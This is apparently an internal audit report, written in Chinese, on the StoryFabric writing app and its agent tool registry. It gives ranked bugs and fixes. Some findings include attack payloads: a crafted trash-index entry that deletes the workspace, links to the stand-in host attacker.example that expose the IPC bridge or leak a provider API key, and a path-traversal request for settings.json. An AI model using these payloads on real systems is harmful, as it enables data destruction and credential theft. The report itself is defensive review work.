# StoryFabric 全项目审核报告

**日期：** 2026-09-09
**审核范围：** 全仓库（`src/core`、`src/main`、`src/preload`、`src/renderer`、`src/server`、`src/shared`、`scripts/`、`electron-builder.yml`、`docs/`）
**审核基线：** `1bd083f`（工作树另有未跟踪的 `src/core/tools/__tests__/registrySmoke.test.ts`，为本轮新增的工具可用性冒烟测试）
**方法：** 6 名独立只读审核员分工（智能体工具链、架构与重复实现、安全、测试与验证、数据完整性、文档一致性）+ 主审核人独立复现关键结论。审核员不得修改仓库、不得跑打包；所有结论要求 `file:line` + 可复现证据。

---

## 一、执行摘要

**总体结论：PASS-WITH-ISSUES。** 工程质量在同类项目中属中上：分层清晰、无 TODO/FIXME、测试 54 文件 / 310 用例全绿、`tsc -b` 干净、打包产物可核验、服务端鉴权与路径规范化扎实。但存在 **3 个阻塞级问题**（其中 1 个可导致工作区数据被整体删除、1 个可让任意网页拿到完整 IPC 桥、1 个可外泄供应商密钥）与 **17 个重大级问题**，必须在发布前处理。

| 级别 | 数量 | 分布 |
| --- | --- | --- |
| 阻塞（P0） | 4 | 安全 3、智能体功能 1 |
| 重大（P1） | 17 | 智能体 7、数据 5、架构 3、安全 2 |
| 轻微/建议（P2） | 30+ | 文档、文案、死代码、测试覆盖、打包卫生 |

**对用户提问「智能体命令是否可用」的直接回答：**

- **27 个工具全部可执行**：17 个读工具返回结果、10 个写工具都能产出待确认变更并在确认后正确落盘（主审核人用真实注册表 + 真实工作区逐工具跑通，见 `registrySmoke.test.ts`；审核员用 58 例行为矩阵交叉验证）。
- **但有 2 个工具在真实场景下无法使用**：`save_chapter`/`move_chapter` 写入正文箱所需的 `volumeId` 没有任何工具能查（新工作区里模型只能靠猜 `vol_default`）；`restore_from_trash` 需要的 id 也没有工具能列出。
- **两套注册表已经漂移**：桌面端（`main`）与服务端/Android（`core`）对 25/27 个工具给出的描述与参数 schema 不一致，模型在不同平台上看到的「命令说明书」不同；现有 parity 测试只锁住 3 个工具。
- **4 个写工具在 core 侧不校验入参**：`{"character":"str"}` 会生成「新建人物卡：未命名人物」的待确认变更，桌面端则正确拒绝。

---

## 二、阻塞级问题（P0，发布前必须修）

### P0-1 恶意/损坏的回收站索引可删除整个工作区目录 —— 已复现

- **位置：** `src/core/storage/fileStore.ts:19-25`、`src/core/storage/nodeFileStore.ts:12-21,81-83`、`src/core/workspace/trash.ts:6-8,55-61`、`src/core/workspace/archive.ts:16-18,34-40`
- **成因：** `normalizeRelativePath('')` 返回 `''`；`NodeFileStore.resolve('')` 解析为工作区根目录，而守卫只拒绝 `rel === '..'`；`trashPath()` 用 `entry.trashPath ?? 默认值`，空串不是 nullish；`archive.ts` 又允许 ZIP 携带 `.storyfabric/trash/index.json`。
- **复现（主审核人实测）：** 往工作区塞入 `[{"id":"evil","kind":"chapter","originalPath":"chapters/draft/0001-x.md","deletedAt":1,"title":"x","trashPath":""}]` 后调用 `purgeTrashEntry(store,'evil')`，无异常抛出，工作区根目录下只剩 `.storyfabric`（`AUDIT_TRASH_ERROR null` / `AUDIT_TRASH_SURVIVORS [".storyfabric"]`）。审核员进一步通过真实 HTTP 服务端验证：导入含该条目的 ZIP → `listTrash` 可见 → 点一次「清空/清除」即删掉 `storyfabric.json`、章节、人物、关系。
- **威胁模型：** 攻击者提供一个工作区 ZIP + 用户点一次回收站操作。
- **修复：** ①`normalizeRelativePath` 拒绝 `''`/`'.'`；②`NodeFileStore.remove` 拒绝根目录；③读取 trash 索引时校验条目（`trashPath` 必须以 `.storyfabric/trash/` 开头、`originalPath` 必须是可移植路径）；④导入 ZIP 时拒绝 `.storyfabric/**`（`layout.json` 除外）。

### P0-2 窗口没有导航守卫，Markdown 链接可把完整 IPC 桥交给远程页面 —— 代码链路已确认

- **位置：** `src/main/index.ts:44-49`（只有 `setWindowOpenHandler`，无 `will-navigate`）、`src/renderer/src/components/markdown/Markdown.tsx:8`（未覆写 `a` 组件）、`src/preload/index.ts:16,96`
- **成因：** 聊天/人物/大纲/便签/设定页面渲染的是模型或用户内容；react-markdown 输出 `<a href="...">`（无 `target`/`rel`），点击后同窗口导航；`contextIsolation` 下 preload 桥对任何加载进该窗口的页面都可用。
- **证据：** 审核员用真实 react-markdown 10 验证输出 `<p><a href="https://attacker.example/pwn">click me</a></p>`；主审核人用 `react-dom/server` 渲染真实组件同样得到 `<p><a href="https://attacker.example/pwn">click me</a></p>`，`target=` 与 `rel=` 均不存在（`javascript:` 已被中和为 `href=""`），并确认 `index.ts` 无 `will-navigate`、`Markdown.tsx` 无链接覆写。**未实测 GUI**（需要真实点击），但链路每一环都已执行验证或代码核对。
- **影响：** 远程页面拿到 `window.api` 全量能力：读写工作区、导出工作区、调用 `deployUninstall`（用已存 SSH 凭据），并配合 P0-3 窃取供应商密钥。
- **修复：** ①`will-navigate` 只允许应用自身 origin，其余 `shell.openExternal`；②Markdown 链接加 `target="_blank" rel="noopener noreferrer"`；③`setWindowOpenHandler` 校验协议白名单（`https:`/`http:`）。

### P0-3 `fetchModels` 会把已存供应商密钥发到调用方指定的 URL —— 已确认

- **位置：** `src/main/ipc.ts:164-168`、`src/server/server.ts:287-291`、`src/core/llm/openaiCompatible.ts:126-129`（Bearer 发到 `${baseUrl}/models`）、`gemini.ts:136-139`、`anthropic.ts:195`
- **成因：** 传了 `providerId` 时取已存密钥，但 `baseUrl`/`protocol` 仍用调用方传参。
- **复现（主审核人执行验证）：** 用真实 `SettingsService` 存入密钥，再按 `src/main/ipc.ts:164-168` 的两步调用 `apiKeyOf()` + `fetchProviderModels('openai', 'https://attacker.example/v1', apiKey)`，实际抓到的请求是 `https://attacker.example/v1/models`，请求头 `Authorization: Bearer sk-REAL-SECRET-KEY`。
- **修复：** 给了 `providerId` 就必须从存储里读 `protocol`/`baseUrl`，忽略入参；无 `providerId` 时才允许自定义（新建供应商场景）。

### P0-4 智能体无法向「正文箱」写章节（`volumeId` 无处可查）—— 已复现

- **位置：** `src/core/tools/registry.ts:20-48`（27 个工具里没有列卷工具）、`src/core/tools/writeValidation.ts:23-25,33-35`（`save_chapter box:main` 与 `move_chapter box:main` 都强制要求 `volumeId`）、`src/core/agent/prompts.ts:10-11`
- **复现（主审核人实测）：** 新工作区里逐个用全部读工具扫 `vol_` 字样 → `AUDIT_VOL_LEAKS []`；`save_chapter {box:'main', volumeId:'vol_default'}` 能成功，但模型无从得知这个 id（纯属巧合），传 `vol_1` 则报「未找到目标卷」。
- **影响：** 产品主流程「智能体把章节写进正文箱」在新工作区不可达；模型只能先写草稿箱，而 `move_chapter` 到正文箱同样要 `volumeId`。
- **修复：** 新增 `list_volumes` 读工具（或在 `list_chapters` 结果里始终附带卷列表），并把默认卷 id 写进提示词。

---

## 三、重大级问题（P1）

### 智能体工具链（7 条）

| # | 位置 | 问题 | 证据 |
| --- | --- | --- | --- |
| P1-1 | `core/tools/registry.ts:20-48` vs `main/tools/registry.ts:69-301` | 25/27 个工具的 description/parameters 不一致（只有 `list_notes`、`delete_note` 逐字相同）；core 的 5 个写工具 schema 是 `{"type":"object"}` 空壳，main 有完整字段与 `required` | 主审核人实测 70 处差异；`registryParity.test.ts:14` 只锁 `delete_note` |
| P1-2 | `core/agent/agentLoop.ts:32`、`main/agent/agentLoop.ts:158-160` | `apply()` 未包 try/catch，且 `apply` 恒返回 `{ok:true}`；一次写盘失败会终止整轮对话，模型拿不到「写入失败」的结果 | 审核员复现：`restore_from_trash` 目标已存在 → `apply()` 抛错 → 整轮结束 |
| P1-3 | `main/tools/registry.ts:655-665` | 桌面端 `move_chapter` 不做目标卷校验（core 做）→ 先生成待确认，`apply()` 时才抛错 | 审核员 58 例矩阵里 3 处行为不一致之一 |
| P1-4 | `core/tools/registry.ts:92-109` | core 写工具不校验 payload：`{"character":"str"/[]/123/{}}` 会生成「未命名人物」待确认；`{"character":null}` 直接抛原始 TypeError | 审核员实测；main 侧会拒绝 |
| P1-5 | 同上 | `restore_from_trash` 的 `id` 无法从任何工具获得（没有列回收站工具），提示词却让模型用它 | 主审核人核对 27 个工具名 |
| P1-6 | `core/tools/registry.ts:127` / `main/tools/registry.ts:587-608` | `save_relationship` 在预览时抓取整份关系列表，确认期间他人新增的关系会被覆盖（丢失更新） | 审核员复现：`rel_A` 消失 |
| P1-7 | `core/retrieval/contextBuilder.ts:27-28` | `get_chapter_context` 对 `radius`/`maxChars` 不做数值校验：传 `"abc"` 时返回 `ok:true` 但正文为空、`returnedChars:NaN` | 审核员实测 |

### 数据完整性（5 条）

| # | 位置 | 问题 | 证据 |
| --- | --- | --- | --- |
| P1-8 | `core/workspace/entityStore.ts:123-124` | 新建人物忽略 `tier`，`doc.tier` 恒为 undefined → 永远落到 `characters/secondary/` | **主审核人实测**：`saveCharacter({name:'主角甲', tier:'primary'})` → `tier:"secondary"` |
| P1-9 | `entityStore.ts:110,187,225,273,330,375`、`migration.ts:126-132` | 未知字段在保存/每次打开时被丢弃（无前向兼容）；`storyfabric.json` 的 `version:99` 被静默改回 2 | 审核员实测 `futureField` 丢失 |
| P1-10 | `trash.ts:6-8,44-61` | 除 P0-1 的删除外，`restoreFromTrash` 也会按索引里的 `trashPath`/`originalPath` 搬运任意文件 | 审核员实测把 `storyfabric.json` 搬进章节文件 |
| P1-11 | `main/ipc.ts`（无写队列）、`main/services/entityStore.ts:57`、`core/storage/nodeFileStore.ts:8` | 桌面端每次 IPC 新建 `NodeFileStore`，实例级写队列跨不了调用 → 并发写丢更新/报 EPERM | 审核员 20 次并发复现 6 次 EPERM、2 次关系悬挂；并发 `saveChapter` 3/3 得到相同 `order` |
| P1-12 | `entityStore.ts:145` | 删除人物只把人物文件移入回收站，关系被直接删除且恢复时不还原 | 审核员实测 `relationships-after-restore: []` |

### 架构与重复实现（3 条）

| # | 位置 | 问题 |
| --- | --- | --- |
| P1-13 | `core/agent/agentLoop.ts` vs `main/agent/agentLoop.ts` | 两套 agent 循环已漂移：`@` 引用附件只在桌面端注入（web/Android 直接丢失）；流式期间改会话名会被覆盖；中止在 web/Android 被标成红色错误气泡；标题生成规则不同 |
| P1-14 | `renderer/src/platform/androidApi.ts:263` | `keyPreview` 用 `slice(0,4)+'****'+slice(-4)`，密钥 ≤8 位时把整把密钥写进明文 Preferences 并显示在设置页 |
| P1-15 | `tsconfig.web.json`（无 `types`） | 渲染层类型检查能看到 `@types/node`，渲染层误引 `fs`/`node:` 不会被类型系统拦住 |

### 安全（2 条）

| # | 位置 | 问题 |
| --- | --- | --- |
| P1-16 | `server/server.ts:142` | 静态文件服务在鉴权前执行，路径守卫**零测试覆盖**；审核员把守卫改成 `if(false)` 后 `GET /%2e%2e%2fsettings.json` 返回 200 且带出 `apiKeyEncrypted` |
| P1-17 | `settingsService.ts:53-61`、`deployTargetsStore.ts:27-30` | safeStorage 不可用时降级为 `plain:<base64>`，且密钥文件未设 `0600`（实测 666/644），与服务端 `settingsStore.ts:93-95` 的做法不一致 |

---

## 四、轻微/建议（P2，摘要）

**文档（审核员逐条对照代码）**

- `docs/design.md` 已严重过时（14 vs 27 个工具、flat v1 目录结构、gray-matter、导航项数）→ 建议加「历史文档」横幅或重写。
- `docs/linux-server.md:16` 与 `README.md:57`、代码（多工作区 `workspaces/<id>`）矛盾；`:55-58` 的本地运行命令缺 `STORYFABRIC_DATA_DIR`（会去写 `/data`）；密钥权限文档写 0400，实际 0600。
- `docs/android-handoff.md:10` 声称下限 API 29，`android/variables.gradle:2` 是 23。
- 远程部署 spec 里「按发行版给 Docker 安装命令」「报告端口占用进程」两条未实现（`portOwner` 字段从未赋值）。
- `backlog.md:71`、`specs/…pending-change-presentation-design.md:98` 引用了不存在的 `src/main/llm/__tests__/adapters.test.ts`。
- `README.md:95` 说 `docs/` 不入版本控制，实际已跟踪 15 个文件。

**文案与产品一致性**

- 模型管理页「支持图片输入」开关与聊天窗口「图片」徽标暗示可发图片，但图片输入明确不在范围内（`spec:25`、`backlog:51`）。
- `server.ts:426` 硬编码 `filename=storyfabric.storyfabric.zip`，真实文件名由 `archive.ts:135` 生成且客户端不读该头。
- 品牌「织章」未在 README 出现；`npm run dist` 与 `dist:win` 重复且无人引用。

**测试与发布**

- 37/111 个非测试源文件没有任何测试可达（全部 20 个 `.tsx`、`preload/index.ts`、`main/ipc.ts`、3 个 store）。
- CI/脚本里没有 `tsc`，也没有 asar/bundle/版本一致性校验；`SHA256SUMS` 只覆盖 5 个文件而 tar 里有 166 个 `web/**` 文件，且无人消费。
- 6 条测试缺口经变异验证（服务端静态守卫、登录限流、`settingsService` 更新分支 prune、`hasKey`、`isChildOf`、`isWithin`）。
- `electron-builder.yml` 的 `files` 白名单实际不生效（`builder-debug.yml` 显示 `nodeModuleFilePatterns: ['**/*', …]`），asar 里含 `@capacitor/*`、`jszip` 等；今天没缺依赖，但白名单给了错误的安全感。

**死代码/卫生**

`WORKSPACE_MARKERS`（main 副本）、`DeployOptions`、`ensureServerWorkspace`、`Textarea`、`SelectOptionItem`、`AbortedError`、`bundleFileName`（脚本里硬编码同名字符串）均无人使用；`quickActionModel` 设置项被持久化但运行时从不读取。

---

## 五、已验证正确的部分（供对照，避免只看问题）

- **智能体工具链**：27 个工具全部端到端可执行；`PendingChange` 的 `entityKind/entityId/title/beforeText/afterText` 全部正确；未知工具名返回结构化「未知工具」；非法 JSON 参数不抛错；`save_chapter` 仅改标题不会清空正文；路径逃逸被 FileStore 拦住；提示词列出的 27 个工具名与注册表完全一致。
- **安全底座**：`/api/*`（除 `auth`/`healthz`）全部 401；工作区 id 白名单；静态服务无穿越；访问密钥用固定长度 SHA-256 比较；Cookie `HttpOnly`+`SameSite=Strict`；归档导入拒绝 `../`、绝对路径、超限条目与 zip 炸弹；`shQuote` 含嵌套正确，SSH 密码只走 stdin，主机指纹 TOFU 后拒绝变更；渲染层无 `dangerouslySetInnerHTML`/`eval`，CSP 有效。
- **数据完整性**：实体读写往返逐字节一致（含章节正文与 `terms`）；单文件写入是临时文件 + rename 原子替换；回收站搬运/恢复字节一致且拒绝覆盖活文件；归档往返无损；`deleteVolume` 在有章节时拒绝；front-matter 只解析 YAML 不执行代码。
- **工程卫生**：`src/core` 不引用 `main`/`renderer`/`server`；渲染层不引用 `fs`/`node:`/`electron`；无 `TODO`/`FIXME`/`HACK`；`tsc -b` 与 `vitest` 全绿；服务端/桌面/Android 的默认设置、版本号、打包产物命名一致。

---

## 六、修复计划（建议）

**第一批（P0，建议立即修，预计 1 个工作批次）**

1. 回收站索引校验 + `normalizeRelativePath` 拒绝空路径 + `remove` 拒绝根 + 归档拒收 `.storyfabric/**`（P0-1）。
2. 窗口 `will-navigate` 守卫 + Markdown 链接 `target/rel` + 协议白名单（P0-2）。
3. `fetchModels` 以存储的 `protocol/baseUrl` 为准（P0-3）。
4. 新增 `list_volumes` 工具（并同步两套注册表 + 提示词），让正文箱写入可达（P0-4）。
5. 为以上每条补回归测试（尤其 P0-1 与 P1-16 的穿越用例）。

**第二批（P1，建议下一批次）**

- 工具链：合并两套注册表（core 为唯一源，main 薄封装）+ parity 测试覆盖全部 27 个工具；`apply()` 包 try/catch 并返回失败；core 写工具补 payload 校验；`move_chapter` 对齐；`get_chapter_context` 数值校验；`save_relationship` 改为 apply 时重新读取。
- 数据：修 `tier`；未知字段前向兼容；桌面端加按工作区写队列；删除人物时级联关系可恢复。
- 架构/安全：Android `keyPreview` 改为安全掩码；`tsconfig.web.json` 加 `types`；密钥文件 `0600`。

**第三批（P2）**

- 文档刷新（`design.md` 标注历史、`linux-server.md` 纠正、spec 两条未实现项要么实现要么删除）、测试覆盖补齐（37 个不可达文件优先补 `main/ipc.ts` 与 store）、CI 加 `tsc` + asar/bundle 校验、死代码清理、`quickActionModel` 接线或删除。

---

## 七、审核过程说明

- 6 名审核员均为只读，未修改仓库、未执行打包命令；各自在 `%TEMP%` 下用真实模块复现结论。
- 主审核人独立**执行**复现了 P0-1（工作区被删）、P0-2（渲染出裸 `<a href>`，无 target/rel）、P0-3（密钥随 `Authorization` 发往攻击者 URL）、P0-4（无工具可查 `volumeId`）、P1-8（`tier:'primary'` 仍落 secondary）；P1-14 由代码核对确认。未采信任何未复现的结论。
- 本轮额外用真实注册表 + 真实工作区跑通 27 个工具的正/负路径，并固化为 `src/core/tools/__tests__/registrySmoke.test.ts`。
- 已知限制：本机没有 Docker 与 Linux 服务器，远程部署的真机行为、Electron GUI 的导航劫持「最后一跳」均未实测，报告中已标注。
